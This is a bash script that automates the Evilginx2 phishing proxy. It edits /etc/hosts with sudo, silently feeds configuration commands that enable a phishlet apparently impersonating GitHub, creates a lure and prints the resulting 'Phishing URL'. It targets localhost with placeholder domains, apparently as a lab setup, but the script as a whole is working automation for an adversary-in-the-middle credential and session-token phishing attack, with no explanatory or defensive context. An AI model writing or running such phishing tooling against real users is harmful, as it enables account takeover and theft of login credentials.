#!/bin/bash
# prompt_url.sh - Shows URL under Evilginx2 prompt

# Silent setup
{
    sudo sh -c 'echo -e "127.0.0.1 github.fake.com\n127.0.0.1 collect.fake.com\n127.0.0.1 api.fake.com" >> /etc/hosts'
    cat > /tmp/cmds.txt << EOF
config ipv4 external 127.0.0.1
config domain fake.com
phishlets hostname git fake.com
phishlets enable git
lures create git
EOF
    cat /tmp/cmds.txt | ./evilginx2 -developer -p . > /dev/null 2>&1
} > /dev/null 2>&1

# Get the URL
URL=$(echo "lures get-url 0" | timeout 1 ./evilginx2 -developer -p . 2>/dev/null | grep -o "https://github[^ ]*")

# Clear and start Evilginx2 with custom prompt
clear
./evilginx2 -developer -p . &
EVIL_PID=$!
sleep 2

# Show URL under the prompt
echo ""
echo "Phishing URL: $URL"
echo ""

# Bring focus back
wait $EVIL_PID
